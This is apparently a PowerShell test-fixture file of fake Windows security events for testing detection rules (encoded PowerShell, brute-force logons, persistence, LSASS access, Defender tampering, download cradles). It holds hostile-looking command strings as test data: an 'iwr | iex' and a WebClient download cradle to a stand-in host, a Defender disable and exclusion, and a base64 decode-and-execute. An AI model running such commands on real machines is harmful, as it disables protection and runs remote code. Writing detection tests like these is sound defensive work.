# Fixture scenarios shared by Invoke-Tests.ps1 and Rules.Tests.ps1.
# Each scenario: fake normalized events, the rule it targets, and either Expect (fires or not) or ExpectCount (exact alerts).
# Strings that rules search for are assembled from fragments so that running these tests does not make script block
# logging record the trigger text (which would raise real alerts on your own machine).

function New-FakeEvent {
    param([int]$Id, [string]$Channel = 'Security', [hashtable]$Data = @{}, [double]$SecondsAgo = 0, [string]$SourceIp = $null,
          [string]$CommandLine = $null, [string]$User = 'tester', [string]$HostName = 'LABPC')
    [pscustomobject]@{
        Time = (Get-Date).ToUniversalTime().AddSeconds(-$SecondsAgo); Host = $HostName; Channel = $Channel; EventId = $Id
        RecordId = Get-Random; User = $User; SourceIp = $SourceIp; Process = $null; CommandLine = $CommandLine; Data = $Data
    }
}

$b64     = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output "hello from a test"'))
$tDefend = 'Set-Mp' + 'Preference -DisableRealtimeMonitoring $true'
$tCradle = '(New-Object Net.WebClient).Down' + 'loadString(' + "'http://x.invalid/a.ps1')"
$tIwr    = 'i' + 'wr http://x.invalid/a.ps1 | i' + 'ex'
$tDecode = 'i' + 'ex ([Text.Encoding]::Unicode.GetString([Convert]::From' + 'Base64String(''AAAA'')))'

$Scenarios = @(
    # ---- VGL-0001 encoded PowerShell
    @{ Name = '-EncodedCommand fires';           Rule = 'VGL-0001'; Expect = $true;  Events = @(New-FakeEvent -Id 4688 -CommandLine "powershell.exe -NoProfile -EncodedCommand $b64") }
    @{ Name = '-enc fires';                      Rule = 'VGL-0001'; Expect = $true;  Events = @(New-FakeEvent -Id 4688 -CommandLine "powershell.exe -enc $b64") }
    @{ Name = '-ec fires';                       Rule = 'VGL-0001'; Expect = $true;  Events = @(New-FakeEvent -Id 4688 -CommandLine "pwsh -ec $b64") }
    @{ Name = '-e fires';                        Rule = 'VGL-0001'; Expect = $true;  Events = @(New-FakeEvent -Id 4688 -CommandLine "powershell.exe -e $b64") }
    @{ Name = 'Upper-case switch fires';         Rule = 'VGL-0001'; Expect = $true;  Events = @(New-FakeEvent -Id 4688 -CommandLine "POWERSHELL.EXE -ENCODEDCOMMAND $b64") }
    @{ Name = 'Tiny payload fires';              Rule = 'VGL-0001'; Expect = $true;  Events = @(New-FakeEvent -Id 4688 -CommandLine 'powershell.exe -NoProfile -enc bABzAA==') }
    @{ Name = 'Plain PowerShell does not fire';  Rule = 'VGL-0001'; Expect = $false; Events = @(New-FakeEvent -Id 4688 -CommandLine 'powershell.exe -NoProfile -File C:\scripts\backup.ps1') }
    @{ Name = 'Non-PowerShell -e is ignored';    Rule = 'VGL-0001'; Expect = $false; Events = @(New-FakeEvent -Id 4688 -CommandLine 'git.exe commit -e abcdefghijkl') }
    @{ Name = '4688 + Sysmon 1 count once';      Rule = 'VGL-0001'; ExpectCount = 1; Events = @(
        New-FakeEvent -Id 4688 -CommandLine "powershell.exe -enc $b64" -SecondsAgo 1
        New-FakeEvent -Id 1 -Channel 'Sysmon' -CommandLine "powershell.exe -enc $b64" -SecondsAgo 1) }

    # ---- VGL-0002 brute force (threshold)
    @{ Name = '6 failed logons in 1 min fire';   Rule = 'VGL-0002'; Expect = $true;  Events = @(1..6 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo ($_ * 10) -Data @{ TargetUserName = 'admin' } }) }
    @{ Name = '3 failed logons do not fire';     Rule = 'VGL-0002'; Expect = $false; Events = @(1..3 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo ($_ * 10) }) }
    @{ Name = '6 failures over 1h ignored';      Rule = 'VGL-0002'; Expect = $false; Events = @(1..6 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo ($_ * 600) }) }
    @{ Name = '6 failures from 6 IPs ignored';   Rule = 'VGL-0002'; Expect = $false; Events = @(1..6 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp "10.0.0.$_" -SecondsAgo ($_ * 5) }) }

    # ---- single-event rules
    @{ Name = 'New local user fires';            Rule = 'VGL-0003'; Expect = $true;  Events = @(New-FakeEvent -Id 4720 -Data @{ TargetUserName = 'backdoor'; SubjectUserName = 'admin' }) }
    @{ Name = 'Unrelated event does not fire 0003'; Rule = 'VGL-0003'; Expect = $false; Events = @(New-FakeEvent -Id 4624 -Data @{ LogonType = '2' }) }
    @{ Name = 'User scheduled task fires';       Rule = 'VGL-0004'; Expect = $true;  Events = @(New-FakeEvent -Id 4698 -Data @{ TaskName = '\Updater'; SubjectUserName = 'admin' }) }
    @{ Name = 'Microsoft task is excluded';      Rule = 'VGL-0004'; Expect = $false; Events = @(New-FakeEvent -Id 4698 -Data @{ TaskName = '\Microsoft\Windows\Defrag\ScheduledDefrag' }) }
    @{ Name = 'New service fires';               Rule = 'VGL-0005'; Expect = $true;  Events = @(New-FakeEvent -Id 7045 -Channel 'System' -Data @{ ServiceName = 'evil'; ImagePath = 'C:\Temp\x.exe' }) }
    @{ Name = '7045 + 4697 for one service = 1'; Rule = 'VGL-0005'; ExpectCount = 1; Events = @(
        New-FakeEvent -Id 7045 -Channel 'System' -Data @{ ServiceName = 'evil'; ImagePath = 'C:\Temp\x.exe' } -SecondsAgo 2
        New-FakeEvent -Id 4697 -Data @{ ServiceName = 'evil'; ServiceFileName = 'C:\Temp\x.exe' } -SecondsAgo 2) }
    @{ Name = 'Two different services = 2';      Rule = 'VGL-0005'; ExpectCount = 2; Events = @(
        New-FakeEvent -Id 7045 -Channel 'System' -Data @{ ServiceName = 'evil1' } -SecondsAgo 2
        New-FakeEvent -Id 7045 -Channel 'System' -Data @{ ServiceName = 'evil2' } -SecondsAgo 2) }
    @{ Name = 'Unrelated event does not fire 0005'; Rule = 'VGL-0005'; Expect = $false; Events = @(New-FakeEvent -Id 4688 -CommandLine 'cmd.exe /c dir') }
    @{ Name = 'Run key write fires';             Rule = 'VGL-0006'; Expect = $true;  Events = @(New-FakeEvent -Id 13 -Channel 'Sysmon' -Data @{ TargetObject = 'HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\x'; Image = 'a.exe'; Details = 'b.exe' }) }
    @{ Name = 'Other registry write ignored';    Rule = 'VGL-0006'; Expect = $false; Events = @(New-FakeEvent -Id 13 -Channel 'Sysmon' -Data @{ TargetObject = 'HKU\S-1\Software\Foo\Bar' }) }
    @{ Name = 'LSASS dump access fires';         Rule = 'VGL-0007'; Expect = $true;  Events = @(New-FakeEvent -Id 10 -Channel 'Sysmon' -Data @{ TargetImage = 'C:\Windows\System32\lsass.exe'; GrantedAccess = '0x1010'; SourceImage = 'C:\Users\x\Downloads\tool.exe' }) }
    @{ Name = 'System32 reader of LSASS ignored'; Rule = 'VGL-0007'; Expect = $false; Events = @(New-FakeEvent -Id 10 -Channel 'Sysmon' -Data @{ TargetImage = 'C:\Windows\System32\lsass.exe'; GrantedAccess = '0x1010'; SourceImage = 'C:\Windows\System32\csrss.exe' }) }
    @{ Name = 'Security log cleared fires';      Rule = 'VGL-0008'; Expect = $true;  Events = @(New-FakeEvent -Id 1102 -Data @{ SubjectUserName = 'admin' }) }
    @{ Name = 'Unrelated event does not fire 0008'; Rule = 'VGL-0008'; Expect = $false; Events = @(New-FakeEvent -Id 4688 -CommandLine 'cmd.exe /c dir') }
    @{ Name = 'Defender disable fires';          Rule = 'VGL-0009'; Expect = $true;  Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tDefend }) }
    @{ Name = 'Defender exclusion fires';        Rule = 'VGL-0009'; Expect = $true;  Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = ('Add-Mp' + 'Preference -ExclusionPath C:\Temp') }) }
    @{ Name = 'Benign script block ignored';     Rule = 'VGL-0009'; Expect = $false; Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = 'Get-ChildItem C:\' }) }
    @{ Name = 'External RDP logon fires';        Rule = 'VGL-0010'; Expect = $true;  Events = @(New-FakeEvent -Id 4624 -SourceIp '203.0.113.7' -Data @{ LogonType = '10'; TargetUserName = 'admin' }) }
    @{ Name = 'Internal RDP logon ignored';      Rule = 'VGL-0010'; Expect = $false; Events = @(New-FakeEvent -Id 4624 -SourceIp '192.168.1.20' -Data @{ LogonType = '10'; TargetUserName = 'admin' }) }
    @{ Name = 'Download cradle fires';           Rule = 'VGL-0011'; Expect = $true;  Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tCradle }) }
    @{ Name = 'iwr | iex cradle fires';          Rule = 'VGL-0011'; Expect = $true;  Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tIwr }) }
    @{ Name = 'Plain iwr download ignored';      Rule = 'VGL-0011'; Expect = $false; Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = 'iwr http://x.invalid/a.zip -OutFile a.zip' }) }

    # ---- VGL-0012 runtime decode
    @{ Name = 'Runtime decode (cmdline) fires';  Rule = 'VGL-0012'; Expect = $true;  Events = @(New-FakeEvent -Id 4688 -CommandLine "powershell.exe -Command $tDecode") }
    @{ Name = 'Runtime decode (4104) fires';     Rule = 'VGL-0012'; Expect = $true;  Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tDecode }) }
    @{ Name = 'Decode without execute ignored';  Rule = 'VGL-0012'; Expect = $false; Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = '[Convert]::From' + 'Base64String(''AAAA'')' }) }
    @{ Name = '4688 + 4104 decode count once';   Rule = 'VGL-0012'; ExpectCount = 1; Events = @(
        New-FakeEvent -Id 4688 -CommandLine "powershell.exe -Command $tDecode" -SecondsAgo 2
        New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tDecode } -SecondsAgo 1) }

    # ---- VGL-0101 brute force then success
    @{ Name = 'Failures then success fires';     Rule = 'VGL-0101'; Expect = $true;  Events = @(
        1..6 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo (100 - $_) }
        New-FakeEvent -Id 4624 -SourceIp '10.0.0.99' -SecondsAgo 30 -Data @{ LogonType = '3'; TargetUserName = 'admin' }) }
    @{ Name = 'Failures but no success';         Rule = 'VGL-0101'; Expect = $false; Events = @(1..6 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo (100 - $_) }) }
    @{ Name = 'Success from a different IP';     Rule = 'VGL-0101'; Expect = $false; Events = @(
        1..6 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo (100 - $_) }
        New-FakeEvent -Id 4624 -SourceIp '10.0.0.5' -SecondsAgo 30 -Data @{ LogonType = '3' }) }
    @{ Name = 'Success BEFORE failures ignored'; Rule = 'VGL-0101'; Expect = $false; Events = @(
        New-FakeEvent -Id 4624 -SourceIp '10.0.0.99' -SecondsAgo 200 -Data @{ LogonType = '3' }
        1..6 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo (100 - $_) }) }
    @{ Name = 'Only 3 failures then success';    Rule = 'VGL-0101'; Expect = $false; Events = @(
        1..3 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo (100 - $_) }
        New-FakeEvent -Id 4624 -SourceIp '10.0.0.99' -SecondsAgo 30 -Data @{ LogonType = '3' }) }
    @{ Name = 'Success after the window';        Rule = 'VGL-0101'; Expect = $false; Events = @(
        1..6 | ForEach-Object { New-FakeEvent -Id 4625 -SourceIp '10.0.0.99' -SecondsAgo (3000 - $_) }
        New-FakeEvent -Id 4624 -SourceIp '10.0.0.99' -SecondsAgo 30 -Data @{ LogonType = '3' }) }

    # ---- VGL-0102 new account then persistence
    @{ Name = 'User then task fires';            Rule = 'VGL-0102'; Expect = $true;  Events = @(
        New-FakeEvent -Id 4720 -Data @{ TargetUserName = 'x' } -SecondsAgo 60
        New-FakeEvent -Id 4698 -Data @{ TaskName = '\Updater' } -SecondsAgo 30) }
    @{ Name = 'User then service fires';         Rule = 'VGL-0102'; Expect = $true;  Events = @(
        New-FakeEvent -Id 4720 -Data @{ TargetUserName = 'x' } -SecondsAgo 60
        New-FakeEvent -Id 7045 -Channel 'System' -Data @{ ServiceName = 'svc' } -SecondsAgo 20) }
    @{ Name = 'Task BEFORE user ignored';        Rule = 'VGL-0102'; Expect = $false; Events = @(
        New-FakeEvent -Id 4698 -Data @{ TaskName = '\Updater' } -SecondsAgo 60
        New-FakeEvent -Id 4720 -Data @{ TargetUserName = 'x' } -SecondsAgo 30) }
    @{ Name = 'Task on a different host';        Rule = 'VGL-0102'; Expect = $false; Events = @(
        New-FakeEvent -Id 4720 -Data @{ TargetUserName = 'x' } -SecondsAgo 60
        New-FakeEvent -Id 4698 -Data @{ TaskName = '\Updater' } -SecondsAgo 30 -HostName 'OTHERPC') }
    @{ Name = 'Microsoft task does not chain';   Rule = 'VGL-0102'; Expect = $false; Events = @(
        New-FakeEvent -Id 4720 -Data @{ TargetUserName = 'x' } -SecondsAgo 60
        New-FakeEvent -Id 4698 -Data @{ TaskName = '\Microsoft\Windows\Defrag\ScheduledDefrag' } -SecondsAgo 30) }
    @{ Name = 'Task 20 minutes later ignored';   Rule = 'VGL-0102'; Expect = $false; Events = @(
        New-FakeEvent -Id 4720 -Data @{ TargetUserName = 'x' } -SecondsAgo 1300
        New-FakeEvent -Id 4698 -Data @{ TaskName = '\Updater' } -SecondsAgo 30) }

    # ---- VGL-0103 obfuscated PowerShell then evasion / download
    @{ Name = 'Encoded then Defender tamper';    Rule = 'VGL-0103'; Expect = $true;  Events = @(
        New-FakeEvent -Id 4688 -CommandLine "powershell.exe -enc $b64" -SecondsAgo 60
        New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tDefend } -SecondsAgo 20) }
    @{ Name = 'Decode then download cradle';     Rule = 'VGL-0103'; Expect = $true;  Events = @(
        New-FakeEvent -Id 4688 -CommandLine "powershell.exe -Command $tDecode" -SecondsAgo 60
        New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tCradle } -SecondsAgo 20) }
    @{ Name = 'Defender tamper alone';           Rule = 'VGL-0103'; Expect = $false; Events = @(New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tDefend }) }
    @{ Name = 'Tamper BEFORE encoded ignored';   Rule = 'VGL-0103'; Expect = $false; Events = @(
        New-FakeEvent -Id 4104 -Channel 'PowerShell' -Data @{ ScriptBlockText = $tDefend } -SecondsAgo 60
        New-FakeEvent -Id 4688 -CommandLine "powershell.exe -enc $b64" -SecondsAgo 20) }
)
